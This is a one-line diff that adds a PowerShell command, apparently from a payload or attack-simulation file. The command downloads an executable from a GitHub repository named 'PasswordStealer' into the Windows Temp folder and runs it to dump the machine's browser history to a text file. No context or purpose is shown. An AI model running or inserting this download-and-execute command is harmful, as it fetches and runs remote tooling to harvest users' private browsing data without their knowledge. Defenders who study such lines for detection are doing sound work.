@@ -1,0 +1,1 @@
+ powershell.exe iwr https://github.com/tresacton/PasswordStealer/raw/master/BrowsingHistoryView.exe -o C:\Windows\Temp\Browser_History_View.exe;C:\Windows\Temp\Browser_History_View.exe /stext C:\Windows\Temp\Browsers_History.txt
